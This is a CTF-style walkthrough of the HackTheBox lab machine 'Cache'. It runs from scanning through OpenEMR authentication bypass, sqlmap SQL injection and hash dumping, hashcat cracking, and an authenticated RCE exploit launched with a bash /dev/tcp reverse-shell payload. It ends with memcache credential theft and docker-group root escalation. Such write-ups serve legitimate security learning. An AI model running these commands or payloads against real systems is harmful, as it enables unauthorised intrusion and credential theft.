---
layout: walkthrough
title: HackTheBox - Cache
date: 2020-10-08 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/cache.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Öhlinger and this post forms part of my challenge VM writeups. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at Cache --`10.10.10.188`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Cache/Overview.png"  style="width: 65%" />
</p>

## Information Gathering

In order to start the VM, we start with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Cache/logs$ nmap -sC -sV 10.10.10.188
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-22 13:44 EDT
Nmap scan report for 10.10.10.188
Host is up (0.19s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.47 seconds

```

</details>

From the output shown above, we can see that the machine is a Linux machine, and I added `cache.htb` to the `/etc/hosts` file. As this is a Linux machine and it only has 2 open ports, I'm going to assume that we need to start by looking at the web application -- since we have no usernames to even attempt to bruteforce SSH. When browsing to <http://cache.htb> we were presented with the following web page:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Cache/img1.png"  style="width: 100%" />
</p>

### Basic Web Enumeration
While browsing the web application, I ran the following scans:
* Gobuster
* Ffuf
* Wfuzz
* Nikto

The output of the scans is shown below:

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Cache/logs$ sudo gobuster dir -u http://10.10.10.188 -w /usr/share/seclists/Discovery/Web-Content/apache.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.188
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/apache.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/23 08:57:44 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2020/09/23 08:57:45 Finished
===============================================================
```

```bat
vagrant@ko:~/Desktop/HackTheBox/Cache/logs$ ffuf -c -u http://cache.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.cache.htb" -fs 8193

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://cache.htb/
 :: Header           : Host: FUZZ.cache.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: 8193
________________________________________________

:: Progress: [4997/4997] :: Job [1/1] :: 166 req/sec :: Duration: [0:00:30] :: Errors: 0 ::

```

```bat
vagrant@ko:~/Desktop/HackTheBox/Cache$  wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404,403 -u "http://10.10.10.188/FUZZ.txt" -t 100

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.


********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.188/FUZZ.txt
Total requests: 4658

===================================================================
ID           Response   Lines    Word     Chars       Payload                                          
===================================================================


Total time: 19.62576
Processed Requests: 4658
Filtered Requests: 4658
Requests/sec.: 237.3410

```

```bat
vagrant@ko:~/Desktop/HackTheBox/Cache$ nikto -h 10.10.10.188
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.188
+ Target Hostname:    10.10.10.188
+ Target Port:        80
+ Start Time:         2020-09-23 08:22:46 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 2001, size: 5a4f70909088c, mtime: gzip
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET 
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.html: Admin login page/section found.
+ 7863 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2020-09-23 08:53:41 (GMT-4) (1855 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
</details>

As shown above, there really wasn't much to go on, so I started looking through the website. While looking at the web application, I realised that the web application's login form was not submitting the input, so I decided to look at the source code:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Cache/img2.png"  style="width: 80%" />
</p>

Within the source code I found the following link: <http://10.10.10.188/jquery/functionality.js>, which provided us with the following JavaScript functions.

<details>

```javascript
$(function(){
    
    var error_correctPassword = false;
    var error_username = false;
    
    function checkCorrectPassword(){
        var Password = $("#password").val();
        if(Password != 'H@v3_fun'){
            alert("Password didn't Match");
            error_correctPassword = true;
        }
    }
    function checkCorrectUsername(){
        var Username = $("#username").val();
        if(Username != "ash"){
            alert("Username didn't Match");
            error_username = true;
        }
    }
    $("#loginform").submit(function(event) {
        /* Act on the event */
        error_correctPassword = false;
         checkCorrectPassword();
         error_username = false;
         checkCorrectUsername();


        if(error_correctPassword == false && error_username ==false){
            return true;
        }
        else{
            return false;
        }
    });
    
});

```
</details>

As you can see, the `checkCorrectUsername` and `checkCorrectPassword` functions have hardcoded credentials: `ash:H@v3_fun`. Using these credentials, I logged in to the application, which sent us to <http://10.10.10.188/net.html> -- the page itself was still under construction so there wasn't much to look at.

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Cache/img3.png"  style="width: 80%" />
</p>

### ssh

Since the web application didn't provide us with any further input, I decided to try and SSH in to the host, since we knew that port 22 was open:

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Cache$ ssh ash@cache.htb
The authenticity of host 'cache.htb (10.10.10.188)' can't be established.
ECDSA key fingerprint is SHA256:/qQ34g2zzGVlmbMIKeD7JhlhDf/SPzgYFz000v+3KBI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'cache.htb,10.10.10.188' (ECDSA) to the list of known hosts.
ash@cache.htb's password: 
Permission denied, please try again.
ash@cache.htb's password: 
```
</details>

As you can see, I was unable to authenticate to the server using the `ash` user. Since we didn't have anything more to go on, I decided to create a wordlist from the web application and restart the enumeration phase again. In order to create the wordlist, I used CeWL with the following command:

```bat
cewl http://10.10.10.188/ -m 2 -d 5 -w cache_wordlist.lst
```

I generally sort Unique afterwards and then order by length descending -- just personal preference.

```bat
awk '{print length, $0}' cache_wordlist.lst | sort -rn | cut -d ' ' -f2-> wordlist_by_length.lst
```

</details>

This portion was very CTF based, which was not the best, but by bruteforcing the domain name, we managed to find `HMS` as another domain which was also hinted to within the  `User Profile Card` under the additional projects that ASH created, namely; HMS (Hospital Management System).

```bat
wfuzz -H "HOST: FUZZ.htb" -u http://10.10.10.188/ -w wordlist_by_length.lst --hw 973
```

<details>

```bat
wfuzz -H "HOST: FUZZ.htb" -u http://10.10.10.188/ -w wordlist_by_length.lst --hw 973

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.188/
Total requests: 167

===================================================================
ID           Response   Lines    Word     Chars       Payload                                          
===================================================================

000000167:   302        0 L      0 W      0 Ch        "hms"                                            

Total time: 3.986417
Processed Requests: 167
Filtered Requests: 166
Requests/sec.: 41.89225

```

</details>

## HMS Exploitation
After adding `hms.htb` to `/etc/hosts`, we could finally navigate to the next portion of the Challenge VM: <http://hms.htb/interface/login/login.php?site=default>. 

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Cache/img5.png"  style="width: 60%" />
</p>

Looking at the application we can see that it was a 2018 version. Looking at the OpenEMR documentation, we can see that the 2018 versions start in March and end in October: 

* Version 5.0.0 (16 March 2018): <https://www.open-emr.org/wiki/index.php?title=OpenEMR_Downloads&oldid=26817>
* Version 5.0.1 (14 October 2018) <https://www.open-emr.org/wiki/index.php?title=OpenEMR_Downloads&oldid=27961>

Using this, I could limit the search for OpenEMR exploits to Versions 5.0.0 and 5.0.1. Looking at `searchsploit`, the following exploits seem likely to succeed: 

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Cache/img6.png"  style="width: 80%" />
</p>

After attempting a few of them, I started looking at additional exploits and found the following link: <https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf>. Going through the presentation was really interesting and there were hints to SQL Injection which caught my attention:
> SQL Injection in add_edit_event_user.php SQL injection in add_edit_event_user.php is caused by unsanitized user input from the ​eid​,userid​, and ​pid​ parameters.  Exploiting this vulnerability requires authentication to PatientPortal; however, it can be exploited without authentication when combined with the PatientPortal authentication bypass mentioned above.

After looking into the PatientPortal bypass, we see that we can navigate to some pages, including `register.php` which means that we have access to pages that we shouldn't. Since I knew that the bypass was successful, I went back to the PDF and looked at the SQL Injection code:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Cache/img7.png"  style="width: 70%" />
</p>

Navigating to the <http://hms.htb/portal/add_edit_event_user.php?eid=1> page and specifying the `eid` as shown in the screenshot above, returned the following error message:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Cache/img8.png"  style="width: 100%" />
</p>

Success! We managed to get a SQL error, so all signed suggested that SQL injection would be possible for the application.

### SQLmap

In order to automate the SQL injection process, I decided to make use of SQLmap. For the initial enumeration phase, I needed to intercept the request to the `add_edit_event_user.php` page with Burpsuite and then save the web request to a file -- `get_request.req`. The request is shown below:

<details>

```html
GET /portal/add_edit_event_user.php?eid=1 HTTP/1.1
Host: hms.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: OpenEMR=avpn83tuv62b5uot9v2g2mg127; PHPSESSID=9ufbv5a684subpmrudlebksnos
Upgrade-Insecure-Requests: 1
```
</details>

Once the request has been saved, we can feed it into the SQLmap application and attempt to gather useful information about the databases by using the following command:

```sql
sqlmap -r get_request.req --dbs --batch
```

From the SQLmap command above, we know that we have access to the following databases:
* information_schema
* openemr

In order to extract useful information from the databases, we will first need to know what tables are present. I decided to focus my efforts on the `openemr` database since that was the name of the application. We can get the tables by selecting the relevant database and dumping the table names using the following command:

```sql
sqlmap -r get_request.req -D openemr --tables
```

There were 234 tables available within the `openemr` database, so I looked for anything with credentials, users, passwords, etc. One of the interesting tables within the `openemr` database was `users_secure`. Dumping the contents of that table gave us a password hash for the `openemr_admin` user!

```sql
sqlmap -r get_request.req -D openemr -T users_secure --dump
```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Cache/img10.png"  style="width: 100%" />
</p>

Once I had obtained the hash, I used hashid to identify the type of hash, as shown below:

<details>

```bat
Username: openemr_admin
Salt: $2a$05$l2sTLIG6GTBeyBf7TAKL6A$ 
Hash: $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.


vagrant@ko:~/Desktop/HackTheBox/Cache/SQL$ hashid 
$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.
Analyzing '$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
```

</details>

I assumed that the hash was in bcrypt format, so I saved the hash into a file called creds.txt and ran hashcat using the following command:

```bat
hashcat -a 0 -m 3200 creds.txt /usr/share/wordlists/rockyou.txt
```

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Cache/SQL$ hashcat -a 0 -m 3200 creds.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-4790K CPU @ 4.00GHz, 4398/4462 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.:xxxxxx
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEc...F6P0B.
Time.Started.....: Mon Sep 28 04:51:54 2020 (1 sec)
Time.Estimated...: Mon Sep 28 04:51:55 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      857 H/s (6.69ms) @ Accel:8 Loops:16 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 864/14344385 (0.01%)
Rejected.........: 0/864 (0.00%)
Restore.Point....: 832/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:16-32
Candidates.#1....: michelle1 -> felipe

Started: Mon Sep 28 04:51:11 2020
Stopped: Mon Sep 28 04:51:56 2020
```

</details>

After a few seconds, hashcat completed and returned the following:  `$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.:xxxxxx`. Success! We now had another username, password combination to use. To confirm that the creds worked, I logged in to the HMS application and was presented with the following screen:
<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Cache/img12.png"  style="width: 100%" />
</p>

If you recall, there were a few authenticated exploits for the OpenEMR solution which were identified by searchsploit. I decided to make use of the OpenEMR < 5.0.1 - (Authenticated) Remote Code Execution exploit -- 45161.py, which was run using the following command:

```python
python HMS_RCE.py -h http://hms.htb -u openemr_admin -p xxxxxx -c 'bash -i >& /dev/tcp/10.10.14.99/1234 0>&1'
```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Cache/img13.png"  style="width: 80%" />
</p>

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Cache$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.99] from (UNKNOWN) [10.10.10.188] 49648
bash: cannot set terminal process group (1432): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cache:/var/www/hms.htb/public_html/interface/main$ echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a; echo " ";echo "groups:";groups;
<;/sbin/ifconfig -a; echo " ";echo "groups:";groups;        
 
uname -a:
Linux cache 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 
hostname:
cache
 
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
ifconfig:
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:94:89:4f:4c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.188  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::250:56ff:feb9:8d09  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:8d09  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:8d:09  txqueuelen 1000  (Ethernet)
        RX packets 111009  bytes 9842705 (9.8 MB)
        RX errors 0  dropped 377  overruns 0  frame 0
        TX packets 109969  bytes 25162252 (25.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 37244  bytes 2766277 (2.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 37244  bytes 2766277 (2.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

 
groups:
www-data
```

</details>

## Lateral Movement using ash

After looking at the `/etc/passwd` file, I noticed that `ash` was an actual user on the machine. I attempted to access the `ash` user using the `su ash` command with the password from before: `H@v3_fun`. The password was correct and we were in as `ash`! The reason we couldn't initially access ash's account with SSH is because the account was part of the SSH denied users group which prevented SSH authentication.

<details>

```bat
ash@cache:/home$ echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a; echo " ";echo "groups:";groups;
<;/sbin/ifconfig -a; echo " ";echo "groups:";groups;
 
uname -a:
Linux cache 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 
hostname:
cache
 
id
uid=1000(ash) gid=1000(ash) groups=1000(ash)
 
ifconfig:
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:94:89:4f:4c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.188  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::250:56ff:feb9:8d09  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:8d09  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:8d:09  txqueuelen 1000  (Ethernet)
        RX packets 111253  bytes 9871371 (9.8 MB)
        RX errors 0  dropped 377  overruns 0  frame 0
        TX packets 110222  bytes 25204292 (25.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 37701  bytes 2800188 (2.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 37701  bytes 2800188 (2.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 
groups:
ash
```

</details>

The enumeration phase took me quite a while on this machine. The initial commands that I generally run include listing the current users sudo privileges, as shown below:

<details>

```bat
ash@cache:~$ sudo -l
sudo -l
[sudo] password for ash: H@v3_fun

Sorry, user ash may not run sudo on cache.
```

</details>

Since the user was not able to run any privileged commands, I uploaded linpeas to the server and went through the output. It looked as if there was no useful information from the output and I was actually stumped for quite a while. I decided to go through the output again and a hint from the discussion boards helped me focus my efforts on listening ports. The screenshot below is from linpeas output, but you could also use the `ss -plant` command to list all listening ports.

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Cache/img14.png"  style="width: 80%" />
</p>

### Memcache
This article describes what Memcache is and how it works if you are interested: <https://book.hacktricks.xyz/pentesting/11211-memcache>, but the TL;DR is:
> Memcached (pronunciation: mem-cashed, mem-cash-dee) is a general-purpose distributed memory caching system. It is often used to speed up dynamic database-driven websites by caching data and objects in RAM to reduce the number of times an external data source (such as a database or API) must be read.

Now that we know what the purpose of it is, we can try to exploit it. This article <https://www.hackingarticles.in/penetration-testing-on-memcached-server/> provides a fantastic description of how to interact with memcache in an attempt to obtain useful information. After authenticating to the service with telnet, you can run the following command to extract all the keys present in a particular slab:

```bat
stats cachedump 1 0
```
* 1 = slab ID.
* 0 = It represents the number of keys you want to dump, 0 will dump all the keys present in the slab ID respectively.

The output will include several items, which for us included the `user` and `passwd` items which we could extract using `get user` and `get passwd`, respectively. The screenshot below shows the commands being run on the host:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Cache/img15.png"  style="width: 80%" />
</p>

As shown above, we now know the username and password combination for luffy: `luffy:0n3_p1ec3`.

## Privilege Escalation

Using the credentials for `luffy`, I was able to SSH into the machine and begin the enumeration phase for the new user account. 

<details>

```bat
luffy@cache:~$ echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a; echo " ";echo "groups:";groups;
 
uname -a:
Linux cache 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 
hostname:
cache
 
id
uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
 
ifconfig:
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:94:89:4f:4c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.188  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::250:56ff:feb9:8d09  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:8d09  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:8d:09  txqueuelen 1000  (Ethernet)
        RX packets 787260  bytes 109944269 (109.9 MB)
        RX errors 0  dropped 429  overruns 0  frame 0
        TX packets 767885  bytes 314656735 (314.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 44206  bytes 3297595 (3.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 44206  bytes 3297595 (3.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

 
groups:
luffy docker

```

</details>

From the output shown above, we know that `luffy` is part of the docker group and I decided to exploit these permissions -- since we have access to the user which is a part of the docker group which is the same as providing the user root access without the need for the root password. The following links contain a lot of useful information about docker: <https://gtfobins.github.io/gtfobins/docker/> and <https://www.hackingarticles.in/docker-privilege-escalation/>. 

As an initial enumeration step, I looked at the available docker images:
<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Cache/img17.png"  style="width: 100%" />
</p>

As shown above, the ubuntu repository exists so we don't need to create one. We can simply mount it using the following command:

```bat
docker run -v /root:/mnt -it ubuntu
```

> The *–v* parameter specifies that we want to create a volume in the Docker instance. The *–it* parameters put the Docker into the shell mode rather than starting a daemon process. The instance is set up to mount the root filesystem of the target machine to the instance volume, so when the instance starts it immediately loads a chroot into that volume. The output is shown below:


<details>

```bat
luffy@cache:/tmp$ docker run -v /root:/mnt -it ubuntu
root@8294690ed607:/# echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a; echo " ";echo "groups:";groups;
 
uname -a:
Linux 8294690ed607 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 
hostname:
8294690ed607
 
id
uid=0(root) gid=0(root) groups=0(root)
 
ifconfig:
bash: /sbin/ifconfig: No such file or directory
 
groups:
root
```

</details>

Since we're in a docker container and I used the command: `docker run -v /root:/mnt -it ubuntu`, the filesystem was mounted in the `/mnt` directory which I needed to navigate to in order to retrieve the root.txt file.

That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.